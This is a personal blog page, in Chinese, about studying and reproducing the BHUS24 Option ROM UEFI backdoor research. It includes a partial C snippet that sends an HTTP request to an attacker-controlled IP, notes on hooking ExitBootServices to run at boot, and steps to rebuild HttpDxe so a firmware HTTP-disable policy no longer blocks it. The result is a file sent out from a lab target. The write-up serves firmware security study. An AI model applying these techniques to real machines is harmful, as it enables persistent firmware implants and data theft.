@@ -1,0 +1,239 @@
+<!DOCTYPE html><html lang="zh-Hans" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>BHUS24-OpROM Backdoor之学习与复现 | Ivy Shaw's Blog</title><meta name="keywords" content="cyberspace security"><meta name="author" content="Ivy"><meta name="copyright" content="Ivy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="BHUS24-OpROM Backdoorhttps:&#x2F;&#x2F;github.com&#x2F;FFRI&#x2F;orom-backdoor-research UEFI协议和运行时DXE模块利用SimpleFileSystemProtocol来读写FAT32&#x2F;NTFS文件系统，用HttpProtocol来发文件（两个交互接口） 运行时DXE模块在OS加载之后仍然驻留在内存中，可调用Protocol 在Option ROM">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BHUS24-OpROM Backdoor之学习与复现">
+<meta property="og:url" content="http://example.com/2026/01/29/BHUS24-OpROM-Backdoor%E4%B9%8B%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="Ivy Shaw&#39;s Blog">
+<meta property="og:description" content="BHUS24-OpROM Backdoorhttps:&#x2F;&#x2F;github.com&#x2F;FFRI&#x2F;orom-backdoor-research UEFI协议和运行时DXE模块利用SimpleFileSystemProtocol来读写FAT32&#x2F;NTFS文件系统，用HttpProtocol来发文件（两个交互接口） 运行时DXE模块在OS加载之后仍然驻留在内存中，可调用Protocol 在Option ROM">
+<meta property="og:locale">
+<meta property="og:image" content="http://example.com/img/5s.jpg">
+<meta property="article:published_time" content="2026-01-29T02:34:26.000Z">
+<meta property="article:modified_time" content="2026-03-17T09:15:25.826Z">
+<meta property="article:author" content="Ivy">
+<meta property="article:tag" content="cyberspace security">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/5s.jpg"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="http://example.com/2026/01/29/BHUS24-OpROM-Backdoor%E4%B9%8B%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%A4%8D%E7%8E%B0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'BHUS24-OpROM Backdoor之学习与复现',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2026-03-17 17:15:25'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/mycss.css"><meta name="generator" content="Hexo 5.4.2"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/head1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">42</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/5s.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Ivy Shaw's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">BHUS24-OpROM Backdoor之学习与复现</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-01-29T02:34:26.000Z" title="Created 2026-01-29 10:34:26">2026-01-29</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-03-17T09:15:25.826Z" title="Updated 2026-03-17 17:15:25">2026-03-17</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="BHUS24-OpROM Backdoor之学习与复现"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="BHUS24-OpROM-Backdoor"><a href="#BHUS24-OpROM-Backdoor" class="headerlink" title="BHUS24-OpROM Backdoor"></a>BHUS24-OpROM Backdoor</h1><p><a target="_blank" rel="noopener" href="https://github.com/FFRI/orom-backdoor-research">https://github.com/FFRI/orom-backdoor-research</a></p>
+<h2 id="UEFI协议和运行时DXE模块"><a href="#UEFI协议和运行时DXE模块" class="headerlink" title="UEFI协议和运行时DXE模块"></a>UEFI协议和运行时DXE模块</h2><p>利用SimpleFileSystemProtocol来读写FAT32/NTFS文件系统，用HttpProtocol来发文件（两个交互接口）</p>
+<p>运行时DXE模块在OS加载之后仍然驻留在内存中，可调用Protocol</p>
+<h2 id="在Option-ROM中植入后门"><a href="#在Option-ROM中植入后门" class="headerlink" title="在Option ROM中植入后门"></a>在Option ROM中植入后门</h2><h3 id="Option-ROM"><a href="#Option-ROM" class="headerlink" title="Option ROM"></a>Option ROM</h3><ol>
+<li>Option ROM中包含初始化该硬件设备的DXE驱动</li>
+<li>网卡、存储卡、显卡等等都有Option ROM</li>
+<li>PCIe初始化在DXE早期执行</li>
+</ol>
+<img src="/bhus24/1.png" alt="1" style="zoom: 67%;" />
+
+<h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ol>
+<li>隐蔽性强</li>
+<li>自下而上的攻击模式，不接触用户和内核态</li>
+</ol>
+<img src="/bhus24/2.png" alt="1" style="zoom: 50%;" />
+
+<h3 id="植入场景"><a href="#植入场景" class="headerlink" title="植入场景"></a>植入场景</h3><ol>
+<li>芯片或电路板的生产过程中，恶意代码被直接集成到 SoC 或配套的固件中</li>
+<li>攻击者购买合法的硬件（如网卡或 NVMe 控制器），通过特定工具将恶意代码写入其 OROM，然后通过亚马逊、eBay 等在线平台作为“正品”或“翻新件”售出</li>
+<li>用户态恶意软件写入 OROM</li>
+<li>接触式攻击</li>
+</ol>
+<img src="/bhus24/3.png" alt="1" style="zoom: 50%;" />
+
+<h2 id="三种后门及其特点"><a href="#三种后门及其特点" class="headerlink" title="三种后门及其特点"></a>三种后门及其特点</h2><img src="/bhus24/4.png" alt="1" style="zoom: 50%;" />
+
+<h2 id="Uefi-Only-Backdoor"><a href="#Uefi-Only-Backdoor" class="headerlink" title="Uefi-Only Backdoor"></a>Uefi-Only Backdoor</h2><p>核心在于使用Uefi Protocol进行通信和数据读写</p>
+<img src="/bhus24/5.png" alt="1" style="zoom: 50%;" />
+
+<p>demo演示了通过HttpProtocol和FileProtocol窃取C盘上一个文件</p>
+<img src="/bhus24/6.png" alt="1" style="zoom: 50%;" />
+
+<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>找作者要了源代码，第一个后门需要的条件是目标机器上uefi支持Http协议（IPv4&amp;IPv6），而uefi网络功能目前仅用于PXE 远程启动，但实际上最底层的实现可以直接调用，往目标ip上传数据</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> EFI_HTTP_HEADER RequestHeader[<span class="number">1</span>];</span><br><span class="line"> RequestHeader[<span class="number">0</span>].FieldName  = <span class="string">&quot;Host&quot;</span>;</span><br><span class="line"> RequestHeader[<span class="number">0</span>].FieldValue = <span class="string">&quot;192.168.1.108&quot;</span>;</span><br><span class="line"></span><br><span class="line"> EFI_HTTP_MESSAGE RequestMessage;</span><br><span class="line"> RequestMessage.Data.Request = &amp;RequestData;</span><br><span class="line"> RequestMessage.HeaderCount  = <span class="number">1</span>;</span><br><span class="line"> RequestMessage.Headers      = RequestHeader;</span><br><span class="line"> RequestMessage.BodyLength   = <span class="number">0</span>;</span><br><span class="line"> RequestMessage.Body         = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">EFI_HTTP_TOKEN RequestToken;</span><br><span class="line"> RequestToken.Event = <span class="literal">NULL</span>;</span><br><span class="line"> Status = gBS-&gt;CreateEvent(</span><br><span class="line">     EVT_NOTIFY_SIGNAL,</span><br><span class="line">     TPL_CALLBACK,</span><br><span class="line">     RequestCallback,</span><br><span class="line">     <span class="literal">NULL</span>,</span><br><span class="line">     &amp;RequestToken.Event);</span><br><span class="line">HANDLE_ERROR(Status);</span><br><span class="line"></span><br><span class="line"> RequestToken.Status  = EFI_SUCCESS;</span><br><span class="line"> RequestToken.Message = &amp;RequestMessage;</span><br><span class="line"></span><br><span class="line"> gRequestCallbackComplete = FALSE;</span><br><span class="line"></span><br><span class="line"> Status = gHttpProtocol-&gt;Request(</span><br><span class="line">     gHttpProtocol,</span><br><span class="line">     &amp;RequestToken);</span><br></pre></td></tr></table></figure>
+
+<p>uefi setup界面中包含开关http协议栈的功能，比如HP，没有这个功能说明这个机器不支持</p>
+<img src="/bhus24/7.jpg" alt="1" style="zoom: 33%;" />
+
+<p>编译好的.efi作为uefi应用或者驱动，目前还没搭好局域网的攻击验证环境，先在uefi shell中测试一下主要功能</p>
+<img src="/bhus24/8.jpg" alt="1" style="zoom: 33%;" />
+
+<p>load命令相当于一次性植入一个驱动，hook的目标点是ExitBootService，相当于在windows logo页面就会执行后续命令</p>
+<img src="/bhus24/9.jpg" alt="1" style="zoom: 33%;" />
+
+<p>用一个路由器搭了简单的局域网环境</p>
+<img src="/bhus24/10.png" alt="1" style="zoom: 50%;" />
+
+<p>攻击机（我的笔记本）ip：192.168.1.101</p>
+<p>靶机ip：192.168.1.103</p>
+<p>在uefi shell里面测试连通，互相都能Ping通</p>
+<img src="/bhus24/11.png" alt="1" style="zoom: 50%;" />
+
+<img src="/bhus24/12.jpg" alt="1" style="zoom: 33%;" />
+
+<p>但是ping只是基于icmp协议，要用http得用edk2重新编译相关的驱动</p>
+<img src="/bhus24/13.png" alt="1" style="zoom: 50%;" />
+
+<p>然后在uefi shell中先load这些驱动，再运行攻击脚本</p>
+<img src="/bhus24/14.jpg" alt="1" style="zoom: 33%;" />
+
+<p>在windows logo出现的时候有回显，但没有成功发送数据，日志显示是下面这个函数返回了Access Denied</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gHttpProtocol-&gt;Request(</span><br><span class="line"></span><br><span class="line">   gHttpProtocol,</span><br><span class="line"></span><br><span class="line">   &amp;RequestToken);</span><br></pre></td></tr></table></figure>
+
+<p>排查确认了不是防火墙或者Secure Boot的问题</p>
+<p>然后看了一下edk2源码，Request函数在两处会返回Access Denied</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Check whether the token already existed.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">if</span> (EFI_ERROR (NetMapIterate (&amp;HttpInstance-&gt;TxTokens, HttpTokenExist, Token))) &#123;</span><br><span class="line">      <span class="keyword">return</span> EFI_ACCESS_DENIED;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//......</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// HTTP is disabled, return directly if the URI is not HTTPS.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">if</span> (!PcdGetBool (PcdAllowHttpConnections) &amp;&amp; !(HttpInstance-&gt;UseHttps)) &#123;</span><br><span class="line">      DEBUG ((DEBUG_ERROR, <span class="string">&quot;EfiHttpRequest: HTTP is disabled.\n&quot;</span>));</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> EFI_ACCESS_DENIED;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>大概是2种问题：</p>
+<ol>
+<li> TxTokens 中已存在相同 Token（并发 / 重入请求）</li>
+<li> HTTP 被PCD全局策略禁止</li>
+</ol>
+<p>第一处问题，怀疑bootmgfw.efi一类的文件会访问http服务，于是又把这个脚本写成了能在uefi shell中运行的形式</p>
+<img src="/bhus24/15.jpg" alt="1" style="zoom: 33%;" />
+
+<p>运行结果还是一样，排除Token重用</p>
+<p>第二处问题，本质上华硕如果不想让用户使用Http，他们就会把PCD=False写到实际的固件中</p>
+<p>ami的代码中只有两处检查了这个PCD选项，而HttpInit的时候没有检查，所以显示Success，但实际上http不可用</p>
+<img src="/bhus24/16.png" alt="1" style="zoom: 67%;" />
+
+<p>在网上找到一篇文章，说编译HttpDxe的时候出现了Access Denied，回去看了edk2源码</p>
+<img src="/bhus24/17.png" alt="1" style="zoom: 67%;" />
+
+<p>默认是FALSE，EDK2官方给的解决方案是改成TRUE，重新编译Http相关驱动，然后在efi shell中把原来的替换掉</p>
+<img src="/bhus24/18.png" alt="1" style="zoom: 50%;" />
+
+<p>drivers命令查看到固件原本加载的HttpDxe驱动，用Unload把自己编译的HttpDxe替换上去</p>
+<img src="/bhus24/19.jpg" alt="1" style="zoom: 33%;" />
+
+<p>然后重新配置dhcp/ip等等，运行攻击脚本发现数据发送成功，在windows logo有回显</p>
+<img src="/bhus24/20.jpg" alt="1" style="zoom: 67%;" />
+
+<p>http发送成功，在接收端这边也拿到数据了</p>
+<img src="/bhus24/21.png" alt="1" style="zoom: 50%;" />
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Ivy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2026/01/29/BHUS24-OpROM-Backdoor%E4%B9%8B%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%A4%8D%E7%8E%B0/">http://example.com/2026/01/29/BHUS24-OpROM-Backdoor%E4%B9%8B%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%A4%8D%E7%8E%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/5s.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> Donate</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2026/03/17/%E5%A4%B1%E8%B8%AA%E4%BA%BA%E5%8F%A3%E5%9B%9E%E5%BD%92/"><img class="prev-cover" src="/img/5s.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">失踪人口回归</div></div></a></div><div class="next-post pull-right"><a href="/2025/11/06/CVE-2025-4275-Insyde-%E8%AF%81%E4%B9%A6%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><img class="next-cover" src="/img/5s.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">CVE-2025-4275 Insyde 证书注入漏洞复现</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/head1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Ivy</div><div class="author-info__description">BUPT | School of Cyberspace Security</div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">42</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/1vyyyyyy"><i class="fab fa-github"></i><span>我的Github</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/1vyyyyyy" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:ivygetshe11@bupt.edu.cn" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=1258294332&amp;site=qq&amp;menu=yes" target="_blank" title="QQ"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">个人学习笔记，欢迎与我交流学习</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#BHUS24-OpROM-Backdoor"><span class="toc-number">1.</span> <span class="toc-text">BHUS24-OpROM Backdoor</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#UEFI%E5%8D%8F%E8%AE%AE%E5%92%8C%E8%BF%90%E8%A1%8C%E6%97%B6DXE%E6%A8%A1%E5%9D%97"><span class="toc-number">1.1.</span> <span class="toc-text">UEFI协议和运行时DXE模块</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8Option-ROM%E4%B8%AD%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8"><span class="toc-number">1.2.</span> <span class="toc-text">在Option ROM中植入后门</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Option-ROM"><span class="toc-number">1.2.1.</span> <span class="toc-text">Option ROM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%98%E7%82%B9"><span class="toc-number">1.2.2.</span> <span class="toc-text">优点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A4%8D%E5%85%A5%E5%9C%BA%E6%99%AF"><span class="toc-number">1.2.3.</span> <span class="toc-text">植入场景</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E7%A7%8D%E5%90%8E%E9%97%A8%E5%8F%8A%E5%85%B6%E7%89%B9%E7%82%B9"><span class="toc-number">1.3.</span> <span class="toc-text">三种后门及其特点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Uefi-Only-Backdoor"><span class="toc-number">1.4.</span> <span class="toc-text">Uefi-Only Backdoor</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.4.1.</span> <span class="toc-text">复现</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/03/17/%E5%A4%B1%E8%B8%AA%E4%BA%BA%E5%8F%A3%E5%9B%9E%E5%BD%92/" title="失踪人口回归">失踪人口回归</a><time datetime="2026-03-17T02:25:57.000Z" title="Created 2026-03-17 10:25:57">2026-03-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/29/BHUS24-OpROM-Backdoor%E4%B9%8B%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%A4%8D%E7%8E%B0/" title="BHUS24-OpROM Backdoor之学习与复现">BHUS24-OpROM Backdoor之学习与复现</a><time datetime="2026-01-29T02:34:26.000Z" title="Created 2026-01-29 10:34:26">2026-01-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/06/CVE-2025-4275-Insyde-%E8%AF%81%E4%B9%A6%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="CVE-2025-4275 Insyde 证书注入漏洞复现">CVE-2025-4275 Insyde 证书注入漏洞复现</a><time datetime="2025-11-06T09:31:05.000Z" title="Created 2025-11-06 17:31:05">2025-11-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%EF%BC%88%E7%9C%9F%EF%BC%89%E9%82%AA%E4%BF%AE%E5%AE%9E%E9%AA%8C%E4%B9%8BMSI-Bomb-Shell/" title="记一次（真）邪修实验之MSI Bomb Shell">记一次（真）邪修实验之MSI Bomb Shell</a><time datetime="2025-10-15T07:51:35.000Z" title="Created 2025-10-15 15:51:35">2025-10-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/23/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%82%AA%E4%BF%AE%E5%AE%9E%E9%AA%8C%E4%B9%8BAFU-AMI-Firmware-Update-Patch/" title="记一次邪修实验之AFU(AMI Firmware Update) Patch">记一次邪修实验之AFU(AMI Firmware Update) Patch</a><time datetime="2025-09-23T01:16:50.000Z" title="Created 2025-09-23 09:16:50">2025-09-23</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2026 By Ivy</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
